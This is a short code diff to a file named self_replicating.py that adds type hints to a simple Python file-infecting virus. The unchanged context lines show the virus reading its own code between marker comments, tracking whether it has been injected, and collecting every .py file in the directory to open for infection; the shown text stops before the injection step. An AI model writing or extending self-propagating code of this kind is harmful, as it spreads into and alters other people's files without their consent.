@@ -7,10 +7,11 @@ self_replicating.py
 import glob
 ### BEGIN ###
 import sys
+from typing import List
 
 code = []
 with open(sys.argv[0], "r") as file:
-    lines = file.readlines()
+    lines: List[str] = file.readlines()
 
 virus_injected = False
 for line in lines:
@@ -21,7 +22,7 @@ for line in lines:
     if line == "### END ###\n":
         break
 
-py_scripts = glob.glob("*.py")
+py_scripts: List[str] = glob.glob("*.py")
 
 for script in py_scripts:
     with open(script, "r") as file:
